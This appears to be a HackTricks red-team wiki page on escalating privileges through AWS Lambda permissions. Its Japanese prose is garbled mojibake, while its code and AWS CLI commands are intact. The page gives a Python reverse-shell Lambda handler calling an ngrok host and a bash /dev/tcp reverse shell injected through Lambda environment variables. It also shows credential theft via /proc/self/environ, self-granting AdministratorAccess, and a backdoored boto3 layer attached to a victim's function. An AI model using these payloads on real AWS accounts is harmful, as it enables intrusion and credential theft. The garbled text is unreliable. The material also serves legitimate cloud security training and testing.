# AWS - Lambda Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## lambda

More info about lambda in:

{% content-ref url="../aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`ã€`lambda:CreateFunction`ã€ãŠã‚ˆã³ `lambda:InvokeFunction`** æ¨©é™ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
å½¼ã‚‰ã¯**æ–°ã—ã„Lambdaé–¢æ•°ã‚’ä½œæˆã—ã€æ—¢å­˜ã®IAMãƒ­ãƒ¼ãƒ«ã‚’å‰²ã‚Šå½“ã¦ã‚‹ã“ã¨ãŒã§ã**ã€ãã®ãƒ­ãƒ¼ãƒ«ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸæ¨©é™ã‚’é–¢æ•°ã«ä»˜ä¸ã—ã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãã®å¾Œã€**ã“ã®Lambdaé–¢æ•°ã«ã‚³ãƒ¼ãƒ‰ã‚’æ›¸ã„ã¦ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆä¾‹ãˆã°ã€revã‚·ã‚§ãƒ«ã‚’ä½¿ç”¨ã—ã¦ï¼‰**ã€‚\
é–¢æ•°ãŒè¨­å®šã•ã‚Œã‚‹ã¨ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯**ãã®å®Ÿè¡Œã‚’ãƒˆãƒªã‚¬ãƒ¼ã—**ã€AWS APIã‚’é€šã˜ã¦Lambdaé–¢æ•°ã‚’å‘¼ã³å‡ºã™ã“ã¨ã§æ„å›³ã—ãŸã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã«ã‚ˆã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯Lambdaé–¢æ•°ã‚’ä»‹ã—ã¦é–“æ¥çš„ã«ã‚¿ã‚¹ã‚¯ã‚’å®Ÿè¡Œã—ã€ãã‚Œã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸIAMãƒ­ãƒ¼ãƒ«ã«ã‚ˆã£ã¦ä»˜ä¸ã•ã‚ŒãŸã‚¢ã‚¯ã‚»ã‚¹ãƒ¬ãƒ™ãƒ«ã§æ“ä½œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\\

æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’æ‚ªç”¨ã—ã¦**revã‚·ã‚§ãƒ«ã‚’å–å¾—ã—ã€ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ï¼š

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
ã‚ãªãŸã¯ã¾ãŸã€**lambdaé–¢æ•°è‡ªä½“ã®lambdaãƒ­ãƒ¼ãƒ«ã®æ¨©é™ã‚’æ‚ªç”¨ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã‚‚ã—lambdaãƒ­ãƒ¼ãƒ«ã«ååˆ†ãªæ¨©é™ãŒã‚ã‚Œã°ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦ã‚ãªãŸã«ç®¡ç†è€…æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
lambdaã®ãƒ­ãƒ¼ãƒ«è³‡æ ¼æƒ…å ±ã‚’å¤–éƒ¨æ¥ç¶šãªã—ã§æ¼æ´©ã•ã›ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚ã“ã‚Œã¯ã€å†…éƒ¨ã‚¿ã‚¹ã‚¯ã§ä½¿ç”¨ã•ã‚Œã‚‹**ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯éš”é›¢ã•ã‚ŒãŸLambda**ã«ã¨ã£ã¦ä¾¿åˆ©ã§ã™ã€‚é€†ã‚·ã‚§ãƒ«ã‚’ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã—ã¦ã„ã‚‹æœªçŸ¥ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚°ãƒ«ãƒ¼ãƒ—ãŒã‚ã‚‹å ´åˆã€ã“ã®ã‚³ãƒ¼ãƒ‰ã¯lambdaã®å‡ºåŠ›ã¨ã—ã¦è³‡æ ¼æƒ…å ±ã‚’ç›´æ¥æ¼æ´©ã•ã›ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**æ½œåœ¨çš„ãªå½±éŸ¿:** æŒ‡å®šã•ã‚ŒãŸä»»æ„ã®lambdaã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

{% hint style="danger" %}
èˆˆå‘³æ·±ãè¦‹ãˆã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ãŒã€**`lambda:InvokeAsync`** ã¯å˜ç‹¬ã§ã¯ **`aws lambda invoke-async`** ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¾ã›ã‚“ã€‚`lambda:InvokeFunction` ã‚‚å¿…è¦ã§ã™ã€‚
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

å‰ã®ã‚·ãƒŠãƒªã‚ªã¨åŒæ§˜ã«ã€**`lambda:AddPermission`** ã®æ¨©é™ãŒã‚ã‚Œã°ã€**è‡ªåˆ†ã« `lambda:InvokeFunction`** ã®æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**æ½œåœ¨çš„ãªå½±éŸ¿:** æŒ‡å®šã•ã‚ŒãŸä»»æ„ã®lambdaã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

**`iam:PassRole`, `lambda:CreateFunction`, ãŠã‚ˆã³ `lambda:CreateEventSourceMapping`** æ¨©é™ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼ˆãŠãã‚‰ã `dynamodb:PutItem` ãŠã‚ˆã³ `dynamodb:CreateTable` ã‚‚å«ã‚€ï¼‰ã¯ã€**lambda:InvokeFunction** ãªã—ã§ã‚‚é–“æ¥çš„ã« **æ¨©é™ã‚’æ˜‡æ ¼** ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
å½¼ã‚‰ã¯ **æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’æŒã¤Lambdaé–¢æ•°ã‚’ä½œæˆã—ã€æ—¢å­˜ã®IAMãƒ­ãƒ¼ãƒ«ã‚’å‰²ã‚Šå½“ã¦ã‚‹** ã“ã¨ãŒã§ãã¾ã™ã€‚

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯Lambdaã‚’ç›´æ¥å‘¼ã³å‡ºã™ä»£ã‚ã‚Šã«ã€æ—¢å­˜ã®DynamoDBãƒ†ãƒ¼ãƒ–ãƒ«ã‚’è¨­å®šã¾ãŸã¯åˆ©ç”¨ã—ã€ã‚¤ãƒ™ãƒ³ãƒˆã‚½ãƒ¼ã‚¹ãƒãƒƒãƒ”ãƒ³ã‚°ã‚’é€šã˜ã¦Lambdaã«ãƒªãƒ³ã‚¯ã—ã¾ã™ã€‚ã“ã®è¨­å®šã«ã‚ˆã‚Šã€ãƒ†ãƒ¼ãƒ–ãƒ«ã«æ–°ã—ã„ã‚¢ã‚¤ãƒ†ãƒ ãŒè¿½åŠ ã•ã‚Œã‚‹ã¨ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¾ãŸã¯åˆ¥ã®ãƒ—ãƒ­ã‚»ã‚¹ã«ã‚ˆã£ã¦Lambdaé–¢æ•°ãŒ**è‡ªå‹•çš„ã«ãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œ**ã€æ¸¡ã•ã‚ŒãŸIAMãƒ­ãƒ¼ãƒ«ã®æ¨©é™ã§ã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
ã‚‚ã—DynamoDBãŒã™ã§ã«AWSç’°å¢ƒã§ã‚¢ã‚¯ãƒ†ã‚£ãƒ–ã§ã‚ã‚Œã°ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯Lambdaé–¢æ•°ã®ãŸã‚ã«**ã‚¤ãƒ™ãƒ³ãƒˆã‚½ãƒ¼ã‚¹ãƒãƒƒãƒ”ãƒ³ã‚°ã‚’è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚ã—ã‹ã—ã€DynamoDBãŒä½¿ç”¨ã•ã‚Œã¦ã„ãªã„å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯**ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ãŒæœ‰åŠ¹ãªæ–°ã—ã„ãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ä½œæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ï¼š
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
ä»Šã€**ã‚¤ãƒ™ãƒ³ãƒˆã‚½ãƒ¼ã‚¹ãƒãƒƒãƒ”ãƒ³ã‚°ã‚’ä½œæˆã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦Lambdaé–¢æ•°ã‚’DynamoDBãƒ†ãƒ¼ãƒ–ãƒ«ã«æ¥ç¶šã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
DynamoDBã‚¹ãƒˆãƒªãƒ¼ãƒ ã«ãƒªãƒ³ã‚¯ã•ã‚ŒãŸLambdaé–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã€æ”»æ’ƒè€…ã¯**DynamoDBã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’ã‚¢ã‚¯ãƒ†ã‚£ãƒ–ã«ã™ã‚‹ã“ã¨ã§Lambdaã‚’é–“æ¥çš„ã«ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚ã“ã‚Œã¯ã€**DynamoDBãƒ†ãƒ¼ãƒ–ãƒ«ã«ã‚¢ã‚¤ãƒ†ãƒ ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦**å®Ÿç¾ã§ãã¾ã™ï¼š
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**æ½œåœ¨çš„ãªå½±éŸ¿:** æŒ‡å®šã•ã‚ŒãŸlambdaã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### `lambda:AddPermission`

ã“ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯**è‡ªåˆ†è‡ªèº«ï¼ˆã¾ãŸã¯ä»–ã®äººï¼‰ã«ä»»æ„ã®æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ãŒã§ãã‚‹**ï¼ˆã“ã‚Œã¯ãƒªã‚½ãƒ¼ã‚¹ãƒ™ãƒ¼ã‚¹ã®ãƒãƒªã‚·ãƒ¼ã‚’ç”Ÿæˆã—ã¦ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’ä»˜ä¸ã—ã¾ã™ï¼‰ï¼š

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**æ½œåœ¨çš„ãªå½±éŸ¿:** ã‚³ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã—ã¦å®Ÿè¡Œã™ã‚‹æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ã€ä½¿ç”¨ã•ã‚Œã‚‹lambdaã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### `lambda:AddLayerVersionPermission`

ã“ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯**è‡ªåˆ†è‡ªèº«ï¼ˆã¾ãŸã¯ä»–ã®äººï¼‰ã«`lambda:GetLayerVersion`ã®æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ãŒã§ãã‚‹**ã€‚å½¼ã¯ãƒ¬ã‚¤ãƒ¤ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€è„†å¼±æ€§ã‚„æ©Ÿå¯†æƒ…å ±ã‚’æ¢ã™ã“ã¨ãŒã§ãã‚‹ã€‚

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**æ½œåœ¨çš„ãªå½±éŸ¿:** æ©Ÿå¯†æƒ…å ±ã¸ã®æ½œåœ¨çš„ãªã‚¢ã‚¯ã‚»ã‚¹ã€‚

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** æ¨©é™ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€**IAMãƒ­ãƒ¼ãƒ«ã«ãƒªãƒ³ã‚¯ã•ã‚ŒãŸæ—¢å­˜ã®Lambdaé–¢æ•°ã®ã‚³ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚**\
æ”»æ’ƒè€…ã¯**IAMè³‡æ ¼æƒ…å ±ã‚’å¤–éƒ¨ã«æµå‡ºã•ã›ã‚‹ãŸã‚ã«Lambdaã®ã‚³ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**

æ”»æ’ƒè€…ãŒé–¢æ•°ã‚’ç›´æ¥å‘¼ã³å‡ºã™èƒ½åŠ›ã‚’æŒã£ã¦ã„ãªã„å ´åˆã§ã‚‚ã€Lambdaé–¢æ•°ãŒæ—¢ã«å­˜åœ¨ã—ç¨¼åƒã—ã¦ã„ã‚‹å ´åˆã€æ—¢å­˜ã®ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚„ã‚¤ãƒ™ãƒ³ãƒˆã‚’é€šã˜ã¦ãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒé«˜ãã€ã—ãŸãŒã£ã¦å¤‰æ›´ã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡Œã‚’é–“æ¥çš„ã«ä¿ƒé€²ã™ã‚‹ã“ã¨ã«ãªã‚Šã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**æ½œåœ¨çš„ãªå½±éŸ¿:** ä½¿ç”¨ã•ã‚Œã‚‹ãƒ©ãƒ ãƒ€ã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### `lambda:UpdateFunctionConfiguration`

#### ç’°å¢ƒå¤‰æ•°ã‚’ä»‹ã—ãŸRCE

ã“ã®æ¨©é™ã‚’æŒã¤ã¨ã€ãƒ©ãƒ ãƒ€ãŒä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹åŸå› ã¨ãªã‚‹ç’°å¢ƒå¤‰æ•°ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ä¾‹ãˆã°ã€Pythonã§ã¯ã€ç’°å¢ƒå¤‰æ•°`PYTHONWARNING`ã¨`BROWSER`ã‚’æ‚ªç”¨ã—ã¦ã€Pythonãƒ—ãƒ­ã‚»ã‚¹ãŒä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% code overflow="wrap" %}
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
{% endcode %}

ä»–ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆè¨€èªã«ã¯ã€ä½¿ç”¨ã§ãã‚‹ä»–ã®ç’°å¢ƒå¤‰æ•°ãŒã‚ã‚Šã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã®ãƒªãƒ³ã‚¯ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆè¨€èªã®ã‚µãƒ–ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% embed url="https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse" %}

#### Lambda Layersã‚’ä»‹ã—ãŸRCE

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html)ã¯ã€**ã‚³ãƒ¼ãƒ‰**ã‚’ãƒ©ãƒ ãƒ€é–¢æ•°ã«å«ã‚ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ãŒã€**åˆ¥ã€…ã«ä¿å­˜**ã™ã‚‹ãŸã‚ã€é–¢æ•°ã‚³ãƒ¼ãƒ‰ã¯å°ã•ãä¿ãŸã‚Œã€**è¤‡æ•°ã®é–¢æ•°ãŒã‚³ãƒ¼ãƒ‰ã‚’å…±æœ‰**ã§ãã¾ã™ã€‚

ãƒ©ãƒ ãƒ€å†…ã§ã¯ã€æ¬¡ã®ã‚ˆã†ãªé–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã€Pythonã‚³ãƒ¼ãƒ‰ãŒèª­ã¿è¾¼ã¾ã‚Œã‚‹ãƒ‘ã‚¹ã‚’ç¢ºèªã§ãã¾ã™ï¼š
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
ã“ã‚Œã‚‰ã®å ´æ‰€ã§ã™ï¼š

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

ä¾‹ãˆã°ã€ãƒ©ã‚¤ãƒ–ãƒ©ãƒªboto3ã¯`/var/runtime/boto3`ï¼ˆ4ç•ªç›®ã®ä½ç½®ï¼‰ã‹ã‚‰èª­ã¿è¾¼ã¾ã‚Œã¾ã™ã€‚

#### æ‚ªç”¨

`lambda:UpdateFunctionConfiguration`ã®æ¨©é™ã‚’æ‚ªç”¨ã—ã¦ã€**æ–°ã—ã„ãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’**lambdaé–¢æ•°ã«**è¿½åŠ ã™ã‚‹**ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã«ã¯ã€ã“ã®ãƒ¬ã‚¤ãƒ¤ãƒ¼ã«**lambdaãŒã‚¤ãƒ³ãƒãƒ¼ãƒˆã™ã‚‹ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’å«ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚lambdaã®ã‚³ãƒ¼ãƒ‰ã‚’èª­ã‚€ã“ã¨ãŒã§ãã‚Œã°ã€ã“ã‚Œã‚’ç°¡å˜ã«è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€lambdaãŒ**ã™ã§ã«ãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹**å¯èƒ½æ€§ãŒã‚ã‚Šã€ãã®ãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’**ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ã¦**è‡ªåˆ†ã®ã‚³ãƒ¼ãƒ‰ã‚’è¿½åŠ **ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã“ã¨ã«ã‚‚æ³¨æ„ã—ã¦ãã ã•ã„ã€‚

ä¾‹ãˆã°ã€lambdaãŒãƒ©ã‚¤ãƒ–ãƒ©ãƒªboto3ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã¨ä»®å®šã™ã‚‹ã¨ã€ã“ã‚Œã¯ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’æŒã¤ãƒ­ãƒ¼ã‚«ãƒ«ãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’ä½œæˆã—ã¾ã™ï¼š
```bash
pip3 install -t ./lambda_layer boto3
```
`./lambda_layer/boto3/__init__.py`ã‚’é–‹ãã€**ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚³ãƒ¼ãƒ‰ã«ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚’è¿½åŠ **ã—ã¾ã™ï¼ˆä¾‹ãˆã°ã€è³‡æ ¼æƒ…å ±ã‚’å¤–éƒ¨ã«é€ä¿¡ã™ã‚‹é–¢æ•°ã‚„ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å–å¾—ã™ã‚‹é–¢æ•°ãªã©ï¼‰ã€‚

æ¬¡ã«ã€ãã®`./lambda_layer`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’zipåœ§ç¸®ã—ã€**æ–°ã—ã„lambdaãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’**è‡ªåˆ†ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ï¼ˆã¾ãŸã¯è¢«å®³è€…ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã€ãŸã ã—ãã®æ¨©é™ãŒãªã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼‰ã€‚\
/opt/python/boto3ã‚’ä¸Šæ›¸ãã™ã‚‹ãŸã‚ã«ã€pythonãƒ•ã‚©ãƒ«ãƒ€ã‚’ä½œæˆã—ã€ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ãã“ã«ç½®ãå¿…è¦ãŒã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã¾ãŸã€ãƒ¬ã‚¤ãƒ¤ãƒ¼ã¯lambdaã§ä½¿ç”¨ã•ã‚Œã‚‹**pythonãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¨äº’æ›æ€§ãŒã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚è‡ªåˆ†ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã™ã‚‹å ´åˆã¯ã€**åŒã˜ãƒªãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™:** 

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ãŸãƒ©ãƒ ãƒ€ãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’**ä»»æ„ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
ãã—ã¦ã€ãƒ©ãƒ ãƒ€ãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’è¢«å®³è€…ã®ãƒ©ãƒ ãƒ€é–¢æ•°ã«æ·»ä»˜ã—ã¾ã™ï¼š
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€**é–¢æ•°ã‚’è‡ªåˆ†ã§å‘¼ã³å‡ºã™**ã‹ã€é€šå¸¸ã®æ‰‹æ®µã§**å‘¼ã³å‡ºã•ã‚Œã‚‹ã®ã‚’å¾…ã¤**ã“ã¨ã§ã™ã€‚ã“ã‚Œã¯ã‚ˆã‚Šå®‰å…¨ãªæ–¹æ³•ã§ã™ã€‚

**ã“ã®è„†å¼±æ€§ã‚’åˆ©ç”¨ã™ã‚‹ãŸã‚ã®ã‚ˆã‚Šã‚¹ãƒ†ãƒ«ã‚¹ãªæ–¹æ³•**ã¯ä»¥ä¸‹ã«ã‚ã‚Šã¾ã™ï¼š

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
